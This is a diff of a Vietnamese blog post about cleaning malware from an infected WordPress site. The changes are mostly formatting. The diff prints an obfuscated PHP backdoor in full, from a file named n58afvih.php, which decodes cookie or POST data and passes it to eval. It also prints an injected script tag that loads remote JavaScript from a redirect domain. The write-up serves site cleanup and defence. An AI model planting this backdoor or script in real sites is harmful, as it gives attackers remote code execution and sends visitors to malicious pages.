@@ -87,14 +87,14 @@ Bước đầu tiên để làm sạch website Wordpress là tìm kiếm và xó
 ```php
 <?php
   $wjqja = 'lpxe2yHu*t#v4-6nd_10a73im9gkcfro\'sb';$ghxqjoz = Array();$ghxqjoz[] = $wjqja[20].$wjqja[22].$wjqja[25].$wjqja[14].$wjqja[4].$wjqja[29].$wjqja[19].$wjqja[18].$wjqja[13].$wjqja[20].$wjqja[28].$wjqja[4].$wjqja[19].$wjqja[13].$wjqja[12].$wjqja[21].$wjqja[21].$wjqja[28].$wjqja[13].$wjqja[20].$wjqja[34].$wjqja[22].$wjqja[16].$wjqja[13].$wjqja[19].$wjqja[14].$wjqja[16].$wjqja[3].$wjqja[4].$wjqja[18].$wjqja[29].$wjqja[4].$wjqja[28].$wjqja[4].$wjqja[22].$wjqja[18];$ghxqjoz[] = $wjqja[6].$wjqja[8];$ghxqjoz[] = $wjqja[10];$ghxqjoz[] = $wjqja[28].$wjqja[31].$wjqja[7].$wjqja[15].$wjqja[9];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[17].$wjqja[30].$wjqja[3].$wjqja[1].$wjqja[3].$wjqja[20].$wjqja[9];$ghxqjoz[] = $wjqja[3].$wjqja[2].$wjqja[1].$wjqja[0].$wjqja[31].$wjqja[16].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[7].$wjqja[34].$wjqja[33].$wjqja[9].$wjqja[30];$ghxqjoz[] = $wjqja[20].$wjqja[30].$wjqja[30].$wjqja[20].$wjqja[5].$wjqja[17].$wjqja[24].$wjqja[3].$wjqja[30].$wjqja[26].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[0].$wjqja[3].$wjqja[15];$ghxqjoz[] = $wjqja[1].$wjqja[20].$wjqja[28].$wjqja[27];foreach ($ghxqjoz[7]($_COOKIE, $_POST) as $xhkmij => $onsbeqz){function fnkka($ghxqjoz, $xhkmij, $eixvz){return $ghxqjoz[6]($ghxqjoz[4]($xhkmij . $ghxqjoz[0], ($eixvz / $ghxqjoz[8]($xhkmij)) + 1), 0, $eixvz);}function ndvxy($ghxqjoz, $rtduq){return @$ghxqjoz[9]($ghxqjoz[1], $rtduq);}function mgcvx($ghxqjoz, $rtduq){$bnqfa = $ghxqjoz[3]($rtduq) % 3;if (!$bnqfa) {eval($rtduq[1]($rtduq[2]));exit();}}$onsbeqz = ndvxy($ghxqjoz, $onsbeqz);mgcvx($ghxqjoz, $ghxqjoz[5]($ghxqjoz[2], $onsbeqz ^ fnkka($ghxqjoz, $xhkmij, $ghxqjoz[8]($onsbeqz))));
-} 
+}
 ```
 
 **n58afvih.php**
 
 ```php
 <?php
-  $wjqja = 'lpxe2yHu*t#v4-6nd_10a73im9gkcfro\'sb';$ghxqjoz = Array();$ghxqjoz[] = $wjqja[20].$wjqja[22].$wjqja[25].$wjqja[14].$wjqja[4].$wjqja[29].$wjqja[19].$wjqja[18].$wjqja[13].$wjqja[20].$wjqja[28].$wjqja[4].$wjqja[19].$wjqja[13].$wjqja[12].$wjqja[21].$wjqja[21].$wjqja[28].$wjqja[13].$wjqja[20].$wjqja[34].$wjqja[22].$wjqja[16].$wjqja[13].$wjqja[19].$wjqja[14].$wjqja[16].$wjqja[3].$wjqja[4].$wjqja[18].$wjqja[29].$wjqja[4].$wjqja[28].$wjqja[4].$wjqja[22].$wjqja[18];$ghxqjoz[] = $wjqja[6].$wjqja[8];$ghxqjoz[] = $wjqja[10];$ghxqjoz[] = $wjqja[28].$wjqja[31].$wjqja[7].$wjqja[15].$wjqja[9];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[17].$wjqja[30].$wjqja[3].$wjqja[1].$wjqja[3].$wjqja[20].$wjqja[9];$ghxqjoz[] = $wjqja[3].$wjqja[2].$wjqja[1].$wjqja[0].$wjqja[31].$wjqja[16].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[7].$wjqja[34].$wjqja[33].$wjqja[9].$wjqja[30];$ghxqjoz[] = $wjqja[20].$wjqja[30].$wjqja[30].$wjqja[20].$wjqja[5].$wjqja[17].$wjqja[24].$wjqja[3].$wjqja[30].$wjqja[26].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[0].$wjqja[3].$wjqja[15];$ghxqjoz[] = $wjqja[1].$wjqja[20].$wjqja[28].$wjqja[27];foreach ($ghxqjoz[7]($_COOKIE, $_POST) as $xhkmij => $onsbeqz){function fnkka($ghxqjoz, $xhkmij, $eixvz){return $ghxqjoz[6]($ghxqjoz[4]($xhkmij . $ghxqjoz[0], ($eixvz / $ghxqjoz[8]($xhkmij)) + 1), 0, $eixvz);}function ndvxy($ghxqjoz, $rtduq){return @$ghxqjoz[9]($ghxqjoz[1], $rtduq);}function mgcvx($ghxqjoz, $rtduq){$bnqfa = $ghxqjoz[3]($rtduq) % 3;if (!$bnqfa) {eval($rtduq[1]($rtduq[2]));exit();}}$onsbeqz = ndvxy($ghxqjoz, $onsbeqz);mgcvx($ghxqjoz, $ghxqjoz[5]($ghxqjoz[2], $onsbeqz ^ fnkka($ghxqjoz, $xhkmij, $ghxqjoz[8]($onsbeqz)))); 
+  $wjqja = 'lpxe2yHu*t#v4-6nd_10a73im9gkcfro\'sb';$ghxqjoz = Array();$ghxqjoz[] = $wjqja[20].$wjqja[22].$wjqja[25].$wjqja[14].$wjqja[4].$wjqja[29].$wjqja[19].$wjqja[18].$wjqja[13].$wjqja[20].$wjqja[28].$wjqja[4].$wjqja[19].$wjqja[13].$wjqja[12].$wjqja[21].$wjqja[21].$wjqja[28].$wjqja[13].$wjqja[20].$wjqja[34].$wjqja[22].$wjqja[16].$wjqja[13].$wjqja[19].$wjqja[14].$wjqja[16].$wjqja[3].$wjqja[4].$wjqja[18].$wjqja[29].$wjqja[4].$wjqja[28].$wjqja[4].$wjqja[22].$wjqja[18];$ghxqjoz[] = $wjqja[6].$wjqja[8];$ghxqjoz[] = $wjqja[10];$ghxqjoz[] = $wjqja[28].$wjqja[31].$wjqja[7].$wjqja[15].$wjqja[9];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[17].$wjqja[30].$wjqja[3].$wjqja[1].$wjqja[3].$wjqja[20].$wjqja[9];$ghxqjoz[] = $wjqja[3].$wjqja[2].$wjqja[1].$wjqja[0].$wjqja[31].$wjqja[16].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[7].$wjqja[34].$wjqja[33].$wjqja[9].$wjqja[30];$ghxqjoz[] = $wjqja[20].$wjqja[30].$wjqja[30].$wjqja[20].$wjqja[5].$wjqja[17].$wjqja[24].$wjqja[3].$wjqja[30].$wjqja[26].$wjqja[3];$ghxqjoz[] = $wjqja[33].$wjqja[9].$wjqja[30].$wjqja[0].$wjqja[3].$wjqja[15];$ghxqjoz[] = $wjqja[1].$wjqja[20].$wjqja[28].$wjqja[27];foreach ($ghxqjoz[7]($_COOKIE, $_POST) as $xhkmij => $onsbeqz){function fnkka($ghxqjoz, $xhkmij, $eixvz){return $ghxqjoz[6]($ghxqjoz[4]($xhkmij . $ghxqjoz[0], ($eixvz / $ghxqjoz[8]($xhkmij)) + 1), 0, $eixvz);}function ndvxy($ghxqjoz, $rtduq){return @$ghxqjoz[9]($ghxqjoz[1], $rtduq);}function mgcvx($ghxqjoz, $rtduq){$bnqfa = $ghxqjoz[3]($rtduq) % 3;if (!$bnqfa) {eval($rtduq[1]($rtduq[2]));exit();}}$onsbeqz = ndvxy($ghxqjoz, $onsbeqz);mgcvx($ghxqjoz, $ghxqjoz[5]($ghxqjoz[2], $onsbeqz ^ fnkka($ghxqjoz, $xhkmij, $ghxqjoz[8]($onsbeqz))));
 }
 ```
 
@@ -171,7 +171,7 @@ Kiểm tra một lượt vẫn không phát hiện ra được gì thêm. Và m�
 Nhưng may thay, ông trời không phụ lòng người. Khi mình mở một bài viết ra để copy dữ liệu của nó thì bỗng nhiên phát hiện ở cuối bài viết bị chèn thêm đoạn script:
 
 ```html
-<script src='https://s2.voipnewswire.net/s2.js' type='text/javascript'></script>
+<script src="https://s2.voipnewswire.net/s2.js" type="text/javascript"></script>
 ```
 
 _À thì ra, khi mình click vào mỗi bài viết đều bị chuyển hướng là do trong nội dung của nó chứa đoạn script này._
@@ -184,7 +184,7 @@ Cách đơn giản nhất có thể nghĩ đến là mở mỗi bài viết ra, 
 
 Nhưng không, mình chả việc gì phải tốn công như vậy. Nội dung của mỗi bài viết đều được lưu trong database. Nghĩa là mình chỉ cần sử dụng chức năng _**Search**_ rồi xóa đoạn code kia đi là xong.
 
-Mình mở **phpMyAdmin** lên (địa chỉ: _http://localhost/phpmyadmin/_) và bắt đầu tìm kiếm như trong hình sau:
+Mình mở **phpMyAdmin** lên (địa chỉ: `http://localhost/phpmyadmin/`) và bắt đầu tìm kiếm như trong hình sau:
 
 ![tìm kiếm mã độc trong database mysql](../images/search_phpmyadmin.png)
 
@@ -227,15 +227,12 @@ Bài viết này mình xin dừng lại tại đây. Bài viết sau mình sẽ 
 
 Thân ái,
 
-★ Tham khảo:
-
-- [Malware là gì? Làm gì khi website bị nhiễm Malware?](https://www.webico.vn/malware-la-gi-lam-gi-khi-website-bi-nhiem-malware/)
-- [Series: Bảo mật Wordpress](https://thachpham.com/series/bao-mat-wordpress-serie)
+★ Tham khảo: [Series: Bảo mật Wordpress](https://thachpham.com/series/bao-mat-wordpress-serie)
 
 <hr class="border-color-light-grey" />
 
 ★ Nếu bạn thấy bài viết này hay thì hãy theo dõi mình trên Facebook để nhận được thông báo khi có bài viết mới nhất nhé:
 
 - Facebook Fanpage: [Complete JavaScript](https://www.facebook.com/completejavascript/)
-- Facebook Group: [Hỏi đáp JavaScript VN](https://www.facebook.com/groups/HoiDapJavascriptVN)  
+- Facebook Group: [Hỏi đáp JavaScript VN](https://www.facebook.com/groups/HoiDapJavascriptVN)
 - Portfoflio: [Lam Pham](http://about.phamvanlam.com/)
